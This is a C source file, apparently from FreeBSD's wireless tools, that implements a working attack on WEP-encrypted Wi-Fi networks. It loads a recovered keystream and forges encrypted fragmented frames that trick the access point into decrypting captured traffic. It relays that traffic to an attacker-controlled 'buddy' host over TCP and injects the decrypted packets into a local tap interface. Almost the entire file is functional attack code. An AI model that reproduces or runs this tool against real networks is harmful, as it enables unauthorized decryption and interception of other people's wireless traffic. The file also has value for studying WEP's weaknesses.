/*-
 * Copyright (c) 2006, Andrea Bittau <a.bittau@cs.ucl.ac.uk>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * $FreeBSD$
 */
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <assert.h>
#include <zlib.h>
#include "w00t.h"

enum {
	S_START = 0,
	S_WAIT_ACK,
	S_WAIT_BUDDY
};

struct queue {
	struct ieee80211_frame *wh;
	int len;
	int id;
	
	char *buf;
	int live;
	struct queue *next;
};

struct params {
	int rx;
	int tx;

	int s;
	int port;

	int tap;

	char mac[6];
	char ap[6];
	char rtr[6];
	struct in_addr src;
	struct in_addr dst;

	char prga[2048];
	int prga_len;
	char iv[3];
	char *fname;

	int state;

	struct queue *q;

	char packet[2048];
	int packet_len;
	struct timeval last;
	int id;
	int data_try;

	int seq;
	int frag;

	char buddy_data[2048];
	int buddy_got;
};

void load_prga(struct params *p)
{
        int fd;
        int rd;

        fd = open(p->fname, O_RDONLY);
        if (fd == -1) {
                p->prga_len = 0;
                return;
        }

        rd = read(fd, p->iv, 3);
        if (rd == -1)
                err(1, "read()");
        if (rd != 3) {
                printf("Short read\n");
                exit(1);
        }

        rd = read(fd, p->prga, sizeof(p->prga));
        if (rd == -1)
                err(1, "read()");
        p->prga_len = rd;

        printf("Loaded %d PRGA from %s\n", p->prga_len, p->fname);
        close(fd);
}

int wanted(struct params *p, struct ieee80211_frame *wh, int len)
{
	char *bssid, *sa;

	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) {
		bssid = wh->i_addr1;
		sa = wh->i_addr2;
	}	
	else {
		bssid = wh->i_addr2;
		sa = wh->i_addr3;
	}	

	if (memcmp(bssid, p->ap, 6) != 0)
		return 0;

	if (!(wh->i_fc[1] & IEEE80211_FC1_PROTECTED)) {
		printf("Got non WEP packet...\n");
		return 0;
	}

	/* my own shit */
	if (memcmp(p->mac, sa, 6) == 0)
		return 0;

	return 1;	
}

void enque(struct params *p, char **buf, struct ieee80211_frame *wh, int len)
{
	struct queue *q = p->q;
	int qlen = 0;
	char *ret = NULL;
	struct queue *last = NULL;

	/* find a slot */
	while (q) {
		if (q->live)
			qlen++;
		else {
			/* recycle */
			ret = q->buf;
			break;
		}

		last = q;
		q = q->next;	
	}

	/* need to create slot */
	if (!q) {
		q = (struct queue*) malloc(sizeof(*q));
		if (!q)
			err(1, "malloc()");
		memset(q, 0, sizeof(*q));
	
		/* insert */
		if (!p->q)
			p->q = q;
		else {
			assert(last);
			last->next = q;
		}
	}

	q->live = 1;
	q->buf = *buf;
	q->len = len;
	q->wh = wh;
	q->id = p->id++;

	qlen++;

	if (qlen > 5)
		printf("Enque.  Size: %d\n", qlen);
	*buf = ret;
}

/********** RIPPED
************/ 
unsigned short in_cksum (unsigned short *ptr, int nbytes) {
  register long sum;
  u_short oddbyte;
  register u_short answer;

  sum = 0;
  while (nbytes > 1)
    {
      sum += *ptr++;
      nbytes -= 2;
    }

  if (nbytes == 1)
    {
      oddbyte = 0;
      *((u_char *) & oddbyte) = *(u_char *) ptr;
      sum += oddbyte;
    }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}
/**************
************/

void send_packet(struct params *p)
{       
        int rc;
        struct ieee80211_frame *wh;

        rc = inject(p->tx, p->packet, p->packet_len);
        if (rc == -1)
                err(1, "inject()");
        if (rc != p->packet_len) {
                printf("Wrote %d/%d\n", rc, p->packet_len);
                exit(1);
        }
        
        p->data_try++;
        wh = (struct ieee80211_frame*) p->packet;
        wh->i_fc[1] |= IEEE80211_FC1_RETRY;

        if (gettimeofday(&p->last, NULL) == -1)
                err(1, "gettimeofday()");
}

void send_header(struct params *p, struct queue *q)
{
	struct ieee80211_frame *wh;
	short *pseq;
	char *ptr;
	struct ip *ih;
	int len, i;
	uLong crc = crc32(0L, Z_NULL, 0);
	uLong *pcrc;

	/* 802.11 */
	memset(p->packet, 0, sizeof(p->packet));
	wh = (struct ieee80211_frame *) p->packet;
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[0] |= IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS;
	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED;
	wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG;

	wh->i_dur[0] = 0x69;

	memcpy(wh->i_addr1, p->ap, 6);
	memcpy(wh->i_addr2, p->mac, 6);
	memcpy(wh->i_addr3, p->rtr, 6);

	pseq = (short*) wh->i_seq;
	p->frag = 0;
	p->seq++;
	*pseq = seqfn(p->seq, p->frag++);

	/* IV */
	ptr = (char*) (wh+1);
	memcpy(ptr, p->iv, 3);
	ptr += 4;

	/* LLC/SNAP */
	memcpy(ptr, "\xAA\xAA\x03\x00\x00\x00\x08\x00", 8);

	/* IP */
	ih = (struct ip*) (ptr+8);
	ih->ip_v = 4;
	ih->ip_hl = 5;
	len = q->len  - sizeof(*wh) - 4 - 4 + 20;
	ih->ip_len = htons(len);
	ih->ip_id = htons(q->id);
	ih->ip_ttl = 69;
	ih->ip_p = 0;
	ih->ip_src.s_addr = p->src.s_addr;
	ih->ip_dst.s_addr = p->dst.s_addr;
	ih->ip_sum = in_cksum((unsigned short*)ih, 20);

	/* ICV */
	len = 8 + 20;
	crc = crc32(crc, ptr, len);
	pcrc = (uLong*) (ptr+len);
	*pcrc = crc;

	/* wepify */
	for (i = 0; i < len + 4; i++)
		ptr[i] ^= p->prga[i];

	p->packet_len = sizeof(*wh) + 4 + len + 4;
	p->data_try = 0;
	send_packet(p);
}

void send_queue(struct params *p)
{
	struct queue *q = p->q;

	assert(q);
	assert(q->live);

	send_header(p, q);
	p->state = S_WAIT_ACK;
}

void send_data(struct params *p)
{
	struct ieee80211_frame *wh;
	short *seq;
	struct queue *q = p->q;
	char *dst, *src;
	int len;

	assert(q);

	/* 802.11 */
	memset(p->packet, 0, sizeof(p->packet));
	wh = (struct ieee80211_frame*) p->packet;
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[0] |= IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS;
	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED;
	
	wh->i_dur[0] = 0x69;
	
	memcpy(wh->i_addr1, p->ap, 6);
	memcpy(wh->i_addr2, p->mac, 6);
	memcpy(wh->i_addr3, p->rtr, 6);

	seq = (short*) wh->i_seq;
	*seq = seqfn(p->seq, p->frag++);

	/* data */
	dst = (char*) (wh+1);
	src = (char*) (q->wh+1);
	len = q->len - sizeof(*wh);
	memcpy(dst, src, len);

	p->packet_len = sizeof(*wh) + len;	
	p->data_try = 0;
	send_packet(p);
}

void got_ack(struct params *p)
{
	switch (p->frag) {
	case 1:
		send_data(p);
		break;

	case 2:
		p->state = S_WAIT_BUDDY;
		p->data_try = 69;
		break;
	}
}

void read_wifi(struct params *p)
{
	static char *buf = 0;
	static int buflen = 4096;
	struct ieee80211_frame *wh;
	int rc;

	if (!buf) {
		buf = (char*) malloc(buflen);
		if (!buf)
			err(1, "malloc()");
	}
	
	rc = sniff(p->rx, buf, buflen);
	if (rc == -1)
		err(1, "sniff()");

	wh = get_wifi(buf, &rc);
	if (!wh)
		return;

	/* acks */
	if (frame_type(wh, IEEE80211_FC0_TYPE_CTL, IEEE80211_FC0_SUBTYPE_ACK) &&
	    (memcmp(p->mac, wh->i_addr1, 6) == 0)) {
		got_ack(p);
		return;
	}

	/* data */
	if (frame_type(wh, IEEE80211_FC0_TYPE_DATA,
		       IEEE80211_FC0_SUBTYPE_DATA)) {
		if (!wanted(p, wh, rc))
			return;
		
		enque(p, &buf, wh, rc);
		if (p->state == S_START)
			send_queue(p);
		return;
	}
}

int connect_buddy(struct params *p)
{
	struct sockaddr_in s_in;

	memset(&s_in, 0, sizeof(s_in));
	s_in.sin_family = PF_INET;
	s_in.sin_port = htons(p->port);
	s_in.sin_addr.s_addr = p->dst.s_addr;

	if ((p->s = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
		return -1;

	if (connect(p->s, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)
		return -1;

	return 0;
}

void buddy_reset(struct params *p)
{
	p->buddy_got = 0;

	if (connect_buddy(p) == -1)
		err(1, "connect_buddy()");
}

int buddy_get(struct params *p, int len)
{
	int rd;

	rd = recv(p->s, &p->buddy_data[p->buddy_got], len, 0);
	if (rd <= 0) {
		buddy_reset(p);
		return 0;
	}

	p->buddy_got += rd;
	return rd == len;
}

void read_buddy_head(struct params *p)
{
	int rem;

	rem = 4 - p->buddy_got;

	if (!buddy_get(p, rem))
		return;
}

void read_buddy_data(struct params *p)
{
	unsigned short *ptr = (unsigned short*) p->buddy_data;
	int id, len, rem;
	struct queue *q = p->q;
	struct queue *last = p->q;
	char mac[12];
	struct iovec iov[2];

	id = ntohs(*ptr++);
	len = ntohs(*ptr++);

	rem = len + 4 - p->buddy_got;

	assert(rem > 0);
	if (!buddy_get(p, rem))
		return;

	/* w00t, got it */
#if 0	
	printf("id=%d len=%d\n", id, len);
#endif	
	p->buddy_got = 0;

	/* feedback loop bullshit */
	if (!q)
		return;
	if (!q->live)
		return;

	/* sanity chex */
	if (q->id != id) {
		printf("Diff ID\n");
		return;
	}

	rem = q->len - sizeof(*q->wh) - 4 - 4;
	if (rem != len) {
		printf("Diff len\n");
		return;
	}

	/* tap */
	if (q->wh->i_fc[1] & IEEE80211_FC1_DIR_TODS) {
		memcpy(mac, q->wh->i_addr3, 6);
		memcpy(&mac[6], q->wh->i_addr2, 6);
	} else {
		memcpy(mac, q->wh->i_addr1, 6);
		memcpy(&mac[6], q->wh->i_addr3, 6);
	}
	iov[0].iov_base = mac;
	iov[0].iov_len = sizeof(mac);
	iov[1].iov_base = (char*)ptr + 8 - 2;
	iov[1].iov_len = len - 8 + 2;

	rem = writev(p->tap, iov, sizeof(iov)/sizeof(struct iovec));
	if (rem == -1)
		err(1, "writev()");
	if (rem != (14+(len-8))) {
		printf("Short write %d\n", rem);
		exit(1);
	}

	/* deque */
	q->live = 0;
	if (q->next) {

		p->q = q->next;

		while (last) {
			if (!last->next) {
				last->next = q;
				q->next = 0;
				break;
			}
			last = last->next;
		}
	}
	
	/* drain queue */
	p->state = S_START;
	if (p->q->live)
		send_queue(p);
}

void read_buddy(struct params *p)
{
	if (p->buddy_got < 4)
		read_buddy_head(p);
	else
		read_buddy_data(p);
}

void own(struct params *p)
{
	struct timeval tv;
	struct timeval *to = NULL;
	fd_set fds;
	int max;
	int tout_ack = 10*1000;
	int tout_buddy = 2*1000*1000;
	int tout = (p->state == S_WAIT_BUDDY) ? tout_buddy : tout_ack;

	if (p->state == S_WAIT_ACK || p->state == S_WAIT_BUDDY) {
		int el;

		/* check timeout */
		if (gettimeofday(&tv, NULL) == -1)
			err(1, "gettimeofday()");
	
		el = elapsed(&p->last, &tv);

		/* timeout */
		if (el >= tout) {
			if (p->data_try > 3) {
				p->state = S_START;
				return;
			} else {
				send_packet(p);
				el = 0;
			}
		}
		el = tout - el;
		tv.tv_sec = el/1000/1000;
		tv.tv_usec = el - tv.tv_sec*1000*1000;
		to = &tv;
	}

	FD_ZERO(&fds);
	FD_SET(p->rx, &fds);
	FD_SET(p->s, &fds);
	max = (p->rx > p->s) ? p->rx : p->s;

	if (select(max+1, &fds, NULL, NULL, to) == -1)
		err(1, "select()");

	if (FD_ISSET(p->rx, &fds))
		read_wifi(p);
	if (FD_ISSET(p->s, &fds))
		read_buddy(p);
}

void usage(char *name)
{
	printf("Usage %s <opts>\n"
	       "-h\thelp\n"
	       "-d\t<buddy ip>\n"
	       "-p\t<port>\n"
	       "-b\t<bssid>\n"
	       "-t\t<tap>\n"
	       "-r\t<rtr>\n"
	       "-s\t<source ip>\n"
	       , name);
	exit(1);
}

int main(int argc, char *argv[])
{
	struct params p;
	char *iface = "wlan0";
	char *tap = "tap0";
	int ch;

	memset(&p, 0, sizeof(p));
	memcpy(p.mac, "\x00\x00\xde\xfa\xce\xd", 6);
	p.fname = "prga.log";
	p.seq = getpid();

	while ((ch = getopt(argc, argv, "hd:p:b:t:r:s:")) != -1) {
		switch (ch) {
		case 's':
			if (!inet_aton(optarg, &p.src)) {
				printf("Can't parse src IP\n");
				exit(1);
			}
			break;

		case 'r':
			if (str2mac(p.rtr, optarg) == -1) {
				printf("Can't parse rtr MAC\n");
				exit(1);
			}
			break;

		case 't':
			tap = optarg;
			break;

		case 'b':
			if (str2mac(p.ap, optarg) == -1) {
				printf("Can't parse BSSID\n");
				exit(1);
			}
			break;

		case 'd':
			if (!inet_aton(optarg, &p.dst)) {
				printf("Can't parse IP\n");
				exit(1);
			}
			break;

		case 'p':
			p.port = atoi(optarg);
			break;

		case 'h':
		default:
			usage(argv[0]);
			break;
		}
	}

	load_prga(&p);
	assert(p.prga_len > 60);

	if ((p.rx = open_rx(iface)) == -1)
		err(1, "open_rx()");
	if ((p.tx = open_tx(iface)) == -1)
		err(1, "open_tx()");

	if ((p.tap = open_tap(tap)) == -1)
		err(1, "open_tap()");
	if (set_iface_mac(tap, p.mac) == -1)
		err(1, "set_iface_mac()");

	if (connect_buddy(&p) == -1)
		err(1, "connect_buddy()");

	p.state = S_START;
	while (1)
		own(&p);

	exit(0);
}
